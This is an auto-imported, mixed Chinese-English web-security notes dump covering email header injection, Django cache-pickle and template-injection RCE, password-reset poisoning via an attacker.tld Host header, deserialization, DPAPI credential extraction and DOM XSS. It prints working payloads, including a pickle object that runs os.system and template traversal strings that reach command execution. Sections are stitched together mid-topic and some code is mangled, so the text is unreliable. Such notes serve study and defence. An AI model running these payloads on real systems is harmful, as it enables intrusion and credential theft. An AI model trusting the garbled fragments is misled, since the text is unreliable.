is before the flag (alphabetically). State 1: the attacker-controlled post is within the browser lazy-loading threshold, so img loading=lazy requests are issued. State 2: the attacker-controlled post remains outside that threshold, so those requests are not issued. Leak: the attacker measures whether those extra requests create enough contention to delay another measurable operation. In practice, headless Chromium can require a different threshold than a normal browser. In the original writeup, a value that worked locally (1850px) had to be increased for the remote headless bot (3350px). Socket / connection contention, where the attacker saturates available connections and times how long an additional request takes. # 工具与参考入口 this 利用 @aszx87410 https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/ https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/img # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/Email Injections 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Email Injections 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Email Injections 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Email Injections 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Email Injections、Inject in sent e-mail、Inject Cc and Bcc after sender argument、Inject argument、Inject Subject argument；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Email Injections Inject in sent e-mail Inject Cc and Bcc after sender argument Inject argument Inject Subject argument Change the body of the message PHP mail () function 利用 The 5th parameter ($additional parameters) Differences in the implementation of /usr/sbin/sendmail Inject in the e-mail name Ignored parts of an email Whitelist 绕过 Quotes IPs Email Encoding Tooling Other vulns Third party SSO # 核心要点 The message will be sent to the original recipient and the attacker account. Inject a two-line feed, then write your message to change the body of the message. This section is going to be based on how to abuse this parameter supposing that an attacker controls it. This parameter is going to be added to the command line PHP will be using to invoke the binary sendmail. However, it will be sanitised with the function escapeshellcmd($additional parameters). An attacker can inject extract parameters for sendmail in this case. Depending on the origin of the sendmail binary different options have been discovered to abuse them and leak files or even execute arbitrary commands. Check how in https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html Punycode: Using Punycode it was possible to inject a tag <style in Joomla and abuse it to steal the CSRF 令牌 via CSS exfiltration. There is a Burp Suite Turbo Intruder script to fuzz these kind of combinations to try to attack email formats. The script already have potentially working combinations. It's laso possible to use Hackvertor to create an email splitting attack # 命令 / 载荷 / 操作片段 # 1. Inject Cc and Bcc after sender argument 1From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com # 2. Inject argument 1From:sender@domain.com%0ATo:attacker@domain.com # 3. Inject Subject argument 1From:sender@domain.com%0ASubject:This is%20Fake%20Subject # 4. Change the body of the message 1From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message. # 5. PHP mail () function 利用 12345678910111213# The function has the following definition:php --rf mailFunction [ <internal:standard> function mail ] { - Parameters [5] { Parameter #0 [ <required> $to ] Parameter #1 [ <required> $subject ] Parameter #2 [ <required> $message ] Parameter #3 [ <optional> $additional_headers ] Parameter #4 [ <optional> $additional_parameters ] }} # 6. Some of the configurations will prevent the Electron application to get RCE or other vulnerabilities if the settings are correctly configured. Some RCE 载荷 from here: If you can execute locally an Electron App it's possible that you could make it execute arbitrary javascript code. Check how in: ../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md If the nodeIntegration is set to on, a web page's JavaScript can use Node.js features easily just by calling the require(). For example, the way to execute the calc application on Windows is: If the contexts aren't isolated an attacker can: Examples of Windows protocol exploits include: Disabling contextIsolation enables the use of <webview> tags, similar to <iframe>, for reading and exfiltrating local files. An example provided demonstrates how to 利用 this 漏洞 to read the contents of internal files: app.importCertificate(options, callback) Imports a PKCS#12 certificate into the system’s certificate store (Linux only). A callback can be used to handle the result. First XSS via webview CSP: The generated CSP included style-src'self' 'unsafe-inline', allowing inline/style-based injection in a vscode-webview://context. The 载荷 beaconed to /stealID to exfiltrate the target webview’s extensionId. Second XSS via postMessage trust: The outer webview trusted window.postMessage without strict origin/type checks and loaded attacker HTML with allowScripts: true. Local file loading via scheme/path rewriting: The 载荷 rewrote file:///... to vscode-file://vscode-app/... and swapped 利用.md for RCE.html, abusing weak path validation to load a privileged local resource. RCE in Node-enabled context: The loaded HTML executed with Node APIs available, yielding OS command execution. # 命令 / 载荷 / 操作片段 # 1. If an attacker can gain write access to the cache, they can escalate this 漏洞 to RCE on the underlying server. This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436 密码 reset and email verification links generated from request.build absolute uri () CSRF logic in deployments with attacker-controlled subdomains or overly broad cookie domains The Django Template Language (DTL) is Turing-complete. If user-supplied data is rendered as a template string (for example by calling Template(user input).render() or when |safe/format html() removes auto-escaping), an attacker may achieve full SSTI → RCE. Send a time-based or arithmetic 载荷: The attacker knows / can guess settings.SECRET KEY (leaks via GitHub, .env, error pages, etc.). CVE-2025-48432 – Log injection via unescaped request.path (fixed June 4 2025). Allows attackers to smuggle newlines/ANSI escape sequences into application logs and poison downstream log ingestion or analyst terminals. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2. CVE-2025-57833 – SQL 注入 in FilteredRelation column aliases (fixed September 3 2025). Dangerous pattern: attacker-controlled dictionary expansion into QuerySet.annotate() / QuerySet.alias() keyword arguments. CVE-2024-42005 – SQL 注入 in QuerySet.values () /values list () on JSONField (fixed August 6 2024). Dangerous pattern: attacker-controlled JSON keys reaching values(*user keys) or values list(*user keys). CVE-2024-53908 – SQL 注入 in direct HasKey (lhs, rhs) usage on Oracle (fixed December 4 2024). The common field has key='x' syntax is unaffected; the risky case is hand-built lookup objects with untrusted lhs. # 命令 / 载荷 / 操作片段 # 1. Cache Manipulation to RCE 1234567python - <<'PY'import pickle, osclass RCE: def __reduce__(self): return (os.system, ("id >/tmp/pwned",))open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))PY # 2. Practical checks 1234POST /accounts/password/reset/ HTTP/1.1Host: attacker.tldX-Forwarded-Host: attacker.tldX-Forwarded-Proto: https # 3. 检测 1{{7*7}} # 4. Context exfiltration when RCE is blocked 12345{{ request }} ｛# confirm SSTI #｝{{ request.META }} ｛# leak Gunicorn/UWSGI headers, cookies, proxy info #｝{{ users }} ｛# QuerySet in the context? #｝{{ users.0 }} ｛# first row #｝{{ users.values }} ｛# dumps dicts of every column (email/flags/plaintext passwords if stored) #｝ # 5. Primitive to RCE 1{{''.__class__.mro()[1].__subclasses__()}} # 6. Primitive to RCE 1{{''.__class__.mro()[1].__subclasses__()438.communicate()[0]}} # 7. 侦察 and tooling 123pip install badsecretsbadsecrets --url https://target.tld/badsecrets '<sessionid_cookie_value>' # 8. content: 来源路径： 02-知识点/Web安全/Deserialization 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Deserialization 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Deserialization 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Deserialization 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Deserialization、Basic Information、PHP、PHP Deserial + Autoload Classes、Laravel Livewire Hydration Chains；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Deserialization Basic Information PHP PHP Deserial + Autoload Classes Laravel Livewire Hydration Chains Serializing Referenced Values Preventing PHP Object Injection with allowed classes Real-world example: Everest Forms (WordPress) CVE-2025-52709 PHPGGC (ysoserial for PHP) phar:// metadata deserialization Python Pickle Yaml & jsonpickle Class Pollution (Python 原型污染) NodeJS JS Magic Functions proto and 原型污染 node-serialize # 核心要点 Deserialization, conversely, is the process that counteracts serialization. It involves taking data that has been structured in a specific format and reconstructing it back into an object. Deserialization can be dangerous because it potentially allows attackers to manipulate the serialized data to execute harmful code or cause unexpected behavior in the application during the object reconstruction process. toString: This method allows an object to be treated as a string. It can be used for reading a file or other tasks based on the function calls within it, effectively providing a textual representation of the object. If allowed classes is omitted or the code runs on PHP < 7.0, the call becomes dangerous as an attacker can craft a 载荷 that abuses magic methods such as wakeup () or destruct () to achieve Remote Code Execution (RCE). On servers that still ran PHP ≤ 7.0 this second branch led to a classic PHP Object Injection when an administrator opened a malicious form submission. A minimal 利用 载荷 could look like: As soon as the admin viewed the entry, the object was instantiated and SomeClass:: destruct() got executed, resulting in arbitrary code execution. PHPGGC can help you generating 载荷 to abuse PHP deserializations.\ For more information read this source**.** https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/ Usage of java.io.ObjectInputStream, readObject, readUnshare functions. ObjectInputStream coupled with the readObject method. Implementation of methods such as readObject, readObjectNodData, readResolve, or readExternal. ObjectInputStream.readUnshared. Read this to learn more about GadgetProbe**.**\ # 命令 / 载荷 / 操作片段 # 1. Serializing Referenced Values 12345678910<?phpclass AClass { public $param1; public $param2;}$o = new WeirdGreeting;$o->param1 =& $o->param22;$o->param = "PARAM";$ser=serialize($o); # 2. Preventing PHP Object Injection with allowed classes 123456789101112// NEVER DO THIS – full object instantiation$object = unserialize($userControlledData);// SAFER – disable object instantiation completely$object = unserialize($userControlledData, [ 'allowed_classes' => false // no classes may be created]);// Granular – only allow a strict white-list of models$object = unserialize($userControlledData, [ 'allowed_classes' => [MyModel::class, DateTime::class]]); # 3. Then on your analysis box, recover the DPAPI SYSTEM LSA secret from the hives and use it to decrypt machine-scope blobs (scheduled task passwords, service 凭据，Wi‑Fi profiles, etc.): Internet Explorer and Google Chrome's passwords and auto-completion data E-mail and internal FTP account passwords for applications like Outlook and Windows Mail Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and 认证 purposes Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more Scheduled task passwords If the user has domain admin privileges, they can access the domain backup key to decrypt all user master keys in the domain: With local admin privileges, it's possible to access the LSASS memory to extract the DPAPI master keys of all the connected users and the SYSTEM key. The risk arises when data flows from a source to a sink without proper validation or sanitation, enabling attacks like XSS. This kind of XSS is probably the hardest to find, as you need to look inside the JS code, see if it's using any object whose value you control, and in that case, see if there is any way to abuse it to execute arbitrary JS. 开放重定向 vulnerabilities in the DOM occur when a script writes data, which an attacker can control, into a sink capable of initiating navigation across domains. From: https://portswigger.net/web-security/dom-based/javascript-injection DOM-based JavaScript injection vulnerabilities are created when a script runs data, which can be controlled by an attacker, as JavaScript code. Document-domain manipulation vulnerabilities occur when a script sets the document.domain property using data that an attacker can control. DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. Ajax request manipulation vulnerabilities arise when a script writes attacker-controllable data into an Ajax request that is issued using an XmlHttpRequest object. Client-side SQL-injection vulnerabilities occur when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way. DOM-based XPath-injection vulnerabilities occur when a script incorporates attacker-controllable data into an XPath query. DOM-based JSON-injection vulnerabilities occur when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application. Web-message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser. An example of vulnerable Web-message manipulation can be found at PortSwigger's Web Security Academy. # 命令 / 载荷 / 操作片段 # 1. Find DOM clobbering vectors (e.g. id / name collisions that overwrite global variables). Fine-tune behaviour via a rich Settings UI (custom canary, auto-injection, redirect blocking, source/sink lists, etc.). Search for an empty canary to reveal all sinks regardless of exploitability (great for 侦察). • Auto-fuzz: enable Postmessage interception ➜ Auto-mutate in settings to let DOM Invader generate canary-based 载荷 and replay them to the handler. data – 载荷 location. Combine with Burp Repeater & Proxy – replicate the browser request/response that produced a vulnerable state and craft final 利用 URLs.
